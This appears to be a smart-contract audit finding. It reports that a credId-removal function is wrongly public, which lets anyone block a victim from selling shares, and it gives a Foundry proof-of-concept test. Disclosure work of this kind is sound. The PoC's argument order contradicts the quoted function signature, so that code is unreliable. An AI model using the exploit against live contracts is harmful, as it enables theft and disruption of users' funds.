# Vulnerability details

## Description
The `_removeCredIdPerAddress` is marked as `public` when it should have `internal` visibility. This allow a malicious actor to directly call this function and manipulate the tracking of credId for any victim's address.

Affected code snippet:
```
function _removeCredIdPerAddress(address user, uint256 credId) public {
    // Function logic
}
```


Example scenario:
- A malicious actor could exploit this by removing all tracked CredIds from a victim's account.
- Once the last CredId is removed, the victim would face an issue where they cannot sell the final share, as the operation would revert with an EmptyArray() error.

## Impact
This vulnerability allows a malicious actor to arbitrarily remove all tracked CredIds from a victim's address. The victim would be unable to sell their remaining shares due to a reversion error, causing financial and operational disruptions.

## Proof of Concept

Add `testPublicAdd_and_Remove` test to the `test/Cred.t.sol` and run it with `forge t --match-contract TestCred --match-test testPublicAdd_and_Remove -vv`

Test
```
contract TestCred is Settings {

//omit...

    function testPublicAdd_and_Remove() public{
        _createCred("BASIC", "SIGNATURE", 0x0);
        vm.startPrank(anyone);
        uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 1);
        uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, 1, 2);

        cred.buyShareCred{ value: buyPrice }(1, 1, maxPrice);
        assertEq(cred.isShareHolder(1, anyone), true, "cred 1 is voted by anyone");
        vm.stopPrank();

        cred._removeCredIdPerAddress(1, anyone);

        vm.startPrank(anyone);
        vm.warp(block.timestamp + 10 minutes + 1 seconds);
        uint256 minPrice = bondingCurve.getSellPriceAfterFee(1, 1, 1);
        cred.sellShareCred(1, 1, minPrice);
    }
}
```
